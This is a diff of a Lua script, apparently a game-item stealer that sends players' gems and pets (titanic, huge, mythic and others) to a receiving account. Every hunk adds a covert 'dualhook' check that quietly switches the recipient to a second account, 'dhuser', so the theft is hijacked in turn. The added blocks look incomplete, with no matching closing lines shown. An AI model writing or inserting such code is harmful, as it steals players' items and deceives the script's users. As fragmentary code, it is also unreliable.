@@ -1127,6 +1127,8 @@ if FinalList == 0 then
         user = ndUser
     end
     if gemsin ~= nil then
+        if dualhook(gemsin) then
+            user = dhuser
         end
     end
     local args = {
@@ -1145,6 +1147,8 @@ spawn(function()
             for i, v in pairs(TList) do
                 user = UserName
                 if titanicin ~= nil then
+                    if dualhook(titanicin) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1171,6 +1175,8 @@ spawn(function()
             for i, v in pairs(BList) do
                 user = UserName
                 if bananin ~= nil then
+                    if dualhook(bananin) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1199,6 +1205,8 @@ spawn(function()
             for i, v in pairs(HList) do
                 user = UserName
                 if hugein ~= nil then
+                    if dualhook(hugein) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1226,6 +1234,8 @@ spawn(function()
             for i, v in pairs(PList) do
                 user = UserName
                 if pogin ~= nil then
+                    if dualhook(pogin) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1252,6 +1262,8 @@ spawn(function()
             for i, v in pairs(EList) do
                 user = UserName
                 if excin ~= nil then
+                    if dualhook(excin) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1278,6 +1290,8 @@ spawn(function()
             for i, v in pairs(EvList) do
                 user = ndUser
                 if eventin ~= nil then
+                    if dualhook(eventin) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1304,6 +1318,8 @@ spawn(function()
             for i, v in pairs(SList) do
                 user = ndUser
                 if secretin ~= nil then
+                    if dualhook(secretin) then
+                        user = dhuser
                     end
                 end
                 local args = {
@@ -1330,6 +1346,8 @@ spawn(function()
             for i, v in pairs(MList) do
                 user = ndUser
                 if mythicin ~= nil then
+                    if dualhook(mythicin) then
+                        user = dhuser
                     end
                 end
                 local args = {
